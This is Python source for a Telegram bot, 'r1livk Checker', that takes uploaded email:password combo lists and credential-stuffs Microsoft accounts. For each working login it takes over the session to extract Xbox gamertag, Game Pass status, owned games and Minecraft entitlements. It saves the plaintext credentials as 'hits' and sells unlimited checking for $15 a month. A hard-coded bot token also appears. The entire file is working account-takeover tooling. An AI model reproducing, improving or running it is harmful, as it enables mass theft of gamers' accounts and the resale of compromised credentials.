# -*- coding: utf-8 -*-
"""
r1livk Checker ⚡ - Telegram Bot (Strict Real Hits Only Mode + Leaderboard)
"""

import os
import re
import time
import json
import threading
from datetime import date
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_ID = 6266959915
CHANNEL_USERNAME = "@r1iv_k"  # يوزر قناتك الخاص
bot = telebot.TeleBot(TOKEN)

PREMIUM_USERS_FILE = "premium_users.txt"
STATS_FILE = "user_stats.json"

def load_json_data(filepath, default_val):
    if not os.path.exists(filepath):
        return default_val
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default_val

def save_json_data(filepath, data):
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except:
        pass

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_premium_user(user_id):
    users = load_premium_users()
    users.add(str(user_id))
    with open(PREMIUM_USERS_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def check_user_subscription(user_id):
    if user_id == OWNER_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception:
        pass
    return False

REQUEST_TIMEOUT = 25
MAX_THREADS = 10

active_scans = {}
user_usage = {}  
DAILY_LIMIT = 2500

def update_user_stats(user_id, checked_count, hits_count, username=None):
    stats = load_json_data(STATS_FILE, {})
    uid_str = str(user_id)
    
    if uid_str not in stats:
        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
    
    stats[uid_str]["checked"] += checked_count
    stats[uid_str]["hits"] += hits_count
    if username:
        stats[uid_str]["username"] = username
        
    save_json_data(STATS_FILE, stats)

def check_daily_limit(chat_id, new_lines_count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        return True, new_lines_count
        
    today = str(date.today())
    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
        user_usage[chat_id] = {"date": today, "count": 0}
    
    current_used = user_usage[chat_id]["count"]
    if current_used >= DAILY_LIMIT:
        return False, 0
    
    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
    return True, allowed_lines

def update_usage(chat_id, count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users(): return 
    today = str(date.today())
    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
        user_usage[chat_id]["count"] += count

def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def fetch_xbox_extra_details_pro(session, xb_token, uhs):
    game_pass_status = "none"
    owned_games_formatted = []
    
    try:
        xsts_xb_payload = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [xb_token]
            },
            "RelyingParty": "https://displaycatalog.mp.microsoft.com",
            "TokenType": "JWT"
        }
        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=10)
        
        if xsts_resp.status_code == 200:
            xsts_token = xsts_resp.json()['Token']
            headers = {
                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                "Accept-Language": "en-US",
                "x-xbl-contract-version": "4"
            }
            
            sub_headers = headers.copy()
            sub_headers["x-xbl-contract-version"] = "2"
            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=10)
            if sub_req.status_code == 200:
                sub_data = sub_req.json()
                for sub in sub_data.get("items", []):
                    name = sub.get("name", "").lower()
                    if "game pass" in name or "ultimate" in name:
                        game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                        break

            xuid = None
            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, timeout=10)
            if people_resp.status_code == 200:
                p_data = people_resp.json()
                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
                    xuid = p_data["profileUsers"][0].get("xuid")

            if not xuid:
                prof_id_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=10)
                if prof_id_req.status_code == 200:
                    try:
                        xuid = prof_id_req.json().get("profileUsers", [{}])[0].get("id")
                    except:
                        pass

            if xuid:
                history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
                history_resp = session.get(history_url, headers=headers, timeout=10)
                if history_resp.status_code == 200:
                    history_data = history_resp.json()
                    counter = 1
                    for title in history_data.get("titles", []):
                        t_name = title.get("name") or title.get("titleName")
                        earned_gs = 0
                        if "achievement" in title:
                            earned_gs = title["achievement"].get("currentGamerscore", 0)
                        
                        if t_name:
                            owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
                            counter += 1
                            if counter > 20:
                                break

            return game_pass_status, owned_games_formatted

    except Exception:
        pass
        
    return game_pass_status, []

def check_single_account(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return "bad", None

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=5, pool_maxsize=5)

    session = requests.Session()
    session.verify = False
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    })

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch"
            "&response_type=token"
            "&locale=en"
        )
        resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
        sftag = extract_ppft(resp.text)
        url_post = extract_url_post(resp.text)

        if not sftag or not url_post:
            session.close()
            return "bad", None

        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': sftag_url,
            'Origin': 'https://login.live.com',
        }
        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        login_text = login_req.text.lower()

        ms_token = None
        full_url = login_req.url
        if 'access_token=' in full_url:
            parsed_url = urlparse(full_url)
            fragment_qs = parse_qs(parsed_url.fragment)
            if 'access_token' in fragment_qs:
                ms_token = fragment_qs['access_token'][0]
            else:
                query_qs = parse_qs(parsed_url.query)
                if 'access_token' in query_qs:
                    ms_token = query_qs['access_token'][0]

        if not ms_token:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
            if token_match:
                ms_token = token_match.group(1)
        
        if not ms_token:
            if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs"]):
                session.close()
                return "twofa", None
            session.close()
            return "bad", None

        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)
        
        if xb_req.status_code != 200:
            session.close()
            return "bad", None

        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0
        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=REQUEST_TIMEOUT)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            gscore_int = int(gamerscore) if gamerscore.isdigit() else 0
        except:
            pass

        mc_ent_text = ""
        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, timeout=REQUEST_TIMEOUT)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, timeout=REQUEST_TIMEOUT)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        has_gp_basic = 'product_game_pass' in mc_ent_text
        has_mc = 'product_minecraft' in mc_ent_text

        detailed_gp, owned_games_list = fetch_xbox_extra_details_pro(session, xb_token, uhs)
        final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")

        session.close()

        # 🔥 شرط صارم جداً: هل الحساب يحتوي فعلاً على ميزات أو ألعاب حقيقية؟
        has_active_gp = "Active" in final_gp or has_gp_basic
        has_games = len(owned_games_list) > 0
        is_real_hit = has_mc or has_active_gp or gscore_int > 0 or has_games

        # إذا كان الحساب فارغاً تماماً (0 جي، بدون ألعاب، بدون مايكروسوفت، بدون جيم باس)، نعتبره BAD فوراً
        if not is_real_hit:
            return "bad", None

        games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"

        hit_info = (
            f"{email}:{password}\n"
            f"Account: Gamertag: {gamertag} | Gamerscore: {gscore_int}G | GamePass: {final_gp} | Minecraft: {'YES' if has_mc else 'NO'}\n"
            f"Games List:\n{games_str}\n"
            f"--------------------------------------------------"
        )
        
        return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": gscore_int > 0 or has_games}

    except Exception:
        if session:
            session.close()
        return "error", None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_channel = types.InlineKeyboardButton("📢 اشترك في القناة الآن", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
        btn_check = types.InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub")
        markup.add(btn_channel, btn_check)
        
        bot.send_message(
            chat_id, 
            "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\n"
            f"القناة: {CHANNEL_USERNAME}\n\n"
            "بعد الاشتراك، اضغط على زر **(تحقق من الاشتراك)** بالأسفل 👇",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return

    show_main_menu(message)

def show_main_menu(message):
    chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
    msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_checker")
    btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
    btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
    markup.add(btn_start, btn_top, btn_premium, btn_account)

    today = str(date.today())
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        status_text = "👑 Premium / Owner (Unlimited)"
    else:
        used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
        status_text = f"👤 Free ({used}/2500 lines today)"

    text = (
        "⚡ **r1livk Checker Pro (Real Hits Only)** ⚡\n\n"
        "Welcome to the ultimate account checking bot.\n"
        f"Your Status: {status_text}\n\n"
        "Click a button below to get started!"
    )
    
    if msg_id:
        try:
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
            return
        except:
            pass
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['premium'])
def give_premium(message):
    chat_id = message.chat.id
    if chat_id != OWNER_ID:
        bot.reply_to(message, "❌ هذا الأمر مخصص لصاحب البوت فقط!")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/premium [User_ID]`", parse_mode="Markdown")
        return

    try:
        target_user_id = int(args[1])
        save_premium_user(target_user_id)
        bot.reply_to(message, f"✅ تم تفعيل وحفظ البريميوم بنجاح للمستخدم: `{target_user_id}` 👑", parse_mode="Markdown")
        try:
            bot.send_message(target_user_id, "🎉 **مبروك!** تم تفعيل اشتراك البريميوم (`Unlimited`) في البوت الخاص بك.")
        except:
            pass
    except ValueError:
        bot.reply_to(message, "❌ الـ ID غير صحيح، تأكد أنه أرقام فقط.")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id

    if call.data == "check_sub":
        if check_user_subscription(chat_id):
            bot.answer_callback_query(call.id, "✅ شكراً لاشتراكك! تم فتح البوت بنجاح.", show_alert=True)
            show_main_menu(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد! الرجاء الاشتراك أولاً.", show_alert=True)
        return

    if not check_user_subscription(chat_id):
        bot.answer_callback_query(call.id, "⚠️ يجب عليك الاشتراك في القناة أولاً!", show_alert=True)
        return

    if call.data == "start_checker":
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
        markup.add(btn_cancel)

        text = (
            "🎮 **r1livk Checker - Real Hits Mode**\n\n"
            "Only real accounts with games, gamepass or minecraft will be captured:\n"
            "• Minecraft Accounts\n"
            "• Xbox Game Pass Active\n"
            "• Games Inventory (Gamerscore > 0)\n\n"
            "Send your combo file in .txt format (Direct file upload)\n"
            "Format: `email:password`"
        )
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
    
    elif call.data == "show_leaderboard":
        stats = load_json_data(STATS_FILE, {})
        if not stats:
            bot.answer_callback_query(call.id, "📊 No stats available yet. Start checking!", show_alert=True)
            return

        sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
        
        lb_text = "🏆 **Top 10 Leaderboard - r1livk Checker** 🏆\n\n"
        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        
        for idx, (uid, data) in enumerate(sorted_users):
            medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
            name = data.get("username", f"User_{uid}")
            checked_c = data.get("checked", 0)
            hits_c = data.get("hits", 0)
            lb_text += f"{medal} **{name}**\n   └ 📊 Checked: `{checked_c}` | 🎯 Hits: `{hits_c}`\n\n"

        markup = types.InlineKeyboardMarkup()
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        markup.add(btn_back)

        try:
            bot.edit_message_text(lb_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except:
            bot.send_message(chat_id, lb_text, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cancel_checker" or call.data == "back_to_menu":
        active_scans[chat_id] = False
        show_main_menu(call.message)

    elif call.data == "stop_scan":
        active_scans[chat_id] = False
        bot.answer_callback_query(call.id, "⏹️ Scan stopped successfully.")

    elif call.data == "buy_premium":
        bot.answer_callback_query(call.id, "💎 Premium Plan: $15/Month\nBenefits: Unlimited checking 24/7!\nContact: @r1livk", show_alert=True)

    elif call.data == "my_account":
        today = str(date.today())
        if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
            bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited Access)", show_alert=True)
        else:
            used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
            bot.answer_callback_query(call.id, f"Current Status: Free\nUsed Today: {used}/2500 lines", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        bot.reply_to(message, f"⚠️ يجب عليك الاشتراك في قناة البوت أولاً: {CHANNEL_USERNAME}")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        local_path = f"temp_combo_{chat_id}.txt"
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)

        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]

        allowed, lines_to_process_count = check_daily_limit(chat_id, len(lines))
        if not allowed or lines_to_process_count <= 0:
            bot.reply_to(message, "⚠️ Daily limit reached! You have already checked 2500 lines today. Upgrade to Premium ($15/Month) for unlimited checks.")
            if os.path.exists(local_path):
                os.remove(local_path)
            return

        lines = lines[:lines_to_process_count]
        bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines...")
        active_scans[chat_id] = True
        
        username = message.from_user.username or message.from_user.first_name
        threading.Thread(target=process_checker, args=(chat_id, local_path, lines, username)).start()

    except Exception as e:
        bot.reply_to(message, f"Error downloading file: {e}")

def process_checker(chat_id, filepath, lines, username):
    total = len(lines)
    checked = 0
    hits = 0
    bad = 0
    twofa = 0
    errors = 0
    mc_hits = 0
    gp_hits = 0
    xbox_hits = 0

    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
    output_filename = f"r1livk_Checker_RealHits_{timestamp_str}.txt"
    start_time = time.time()

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    markup.add(btn_stop, btn_back)

    initial_status_text = (
        f"🔥 **LIVE SCAN STATS (Real Hits Only)**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Checked: 0\n"
        f"❌ Bad: 0\n"
        f"🎯 Hits: 0\n"
        f"📱 2FA: 0\n"
        f"⚠️ Errors: 0\n\n"
        f"Progress: 0.0%\n"
        f"⚡ CPM: 0\n"
        f"⏱️ Elapsed: 00:00:00"
    )
    status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)

    lock = threading.Lock()

    def worker(combo):
        nonlocal checked, hits, bad, twofa, errors, mc_hits, gp_hits, xbox_hits
        if not active_scans.get(chat_id, True):
            return

        status, data = check_single_account(combo)

        with lock:
            checked += 1
            if status == "hit" and data:
                hits += 1
                if data["has_mc"]: mc_hits += 1
                if data["has_gp"]: gp_hits += 1
                if data["has_xbox"]: xbox_hits += 1

                with open(output_filename, 'a', encoding='utf-8') as out_f:
                    out_f.write(data["content"] + "\n\n")
            elif status == "bad":
                bad += 1
            elif status == "twofa":
                twofa += 1
            else:
                errors += 1

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(worker, line) for line in lines]
        
        while any(not f.done() for f in futures):
            if not active_scans.get(chat_id, True):
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            with lock:
                curr_checked = checked
                curr_bad = bad
                curr_hits = hits
                curr_twofa = twofa
                curr_errors = errors
                curr_mc = mc_hits
                curr_gp = gp_hits
                curr_xb = xbox_hits

            elapsed = int(time.time() - start_time)
            if elapsed > 0:
                mins, secs = divmod(elapsed, 60)
                hrs, mins = divmod(mins, 60)
                cpm = int((curr_checked / elapsed) * 60) if elapsed > 0 else 0
                pct = (curr_checked / total) * 100 if total > 0 else 0

                live_text = (
                    f"🔥 **LIVE SCAN STATS (Auto-refresh)**\n\n"
                    f"📊 Total: {total}\n"
                    f"✅ Checked: {curr_checked}\n"
                    f"❌ Bad: {curr_bad}\n"
                    f"🎯 Hits: {curr_hits}\n"
                    f"📱 2FA: {curr_twofa}\n"
                    f"⚠️ Errors: {curr_errors}\n\n"
                    f"Progress: {pct:.1f}%\n"
                    f"⚡ CPM: {cpm}\n"
                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}\n\n"
                    f"🎮 Gaming Hits:\n"
                    f"• MC Hits: {curr_mc}\n"
                    f"• GamePass Hits: {curr_gp}\n"
                    f"• Xbox Live: {curr_xb}"
                )
                try:
                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                except:
                    pass
            time.sleep(1.5)

    update_user_stats(chat_id, checked, hits, username)
    update_usage(chat_id, total)

    elapsed_total = int(time.time() - start_time)
    t_mins, t_secs = divmod(elapsed_total, 60)

    completion_text = (
        f"✅ **XBOX SCAN COMPLETED!**\n\n"
        f"📊 Total Checked: {checked}\n"
        f"🎯 Real Hits: {hits}\n"
        f"  • Minecraft: {mc_hits}\n"
        f"  • GamePass: {gp_hits}\n"
        f"  • Xbox Live: {xbox_hits}\n"
        f"📱 2FA: {twofa}\n"
        f"❌ Bad: {bad}\n\n"
        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}\n"
        f"🏆 Stats updated to Leaderboard!"
    )
    bot.send_message(chat_id, completion_text, parse_mode="Markdown")

    if hits > 0 and os.path.exists(output_filename):
        with open(output_filename, 'rb') as res_f:
            bot.send_document(chat_id, res_f, caption=f"📁 Real Hits File - r1livk")

    if os.path.exists(filepath):
        os.remove(filepath)
    active_scans[chat_id] = False

if __name__ == "__main__":
    print("r1livk Real Hits Checker Bot is running...")
    bot.infinity_polling()
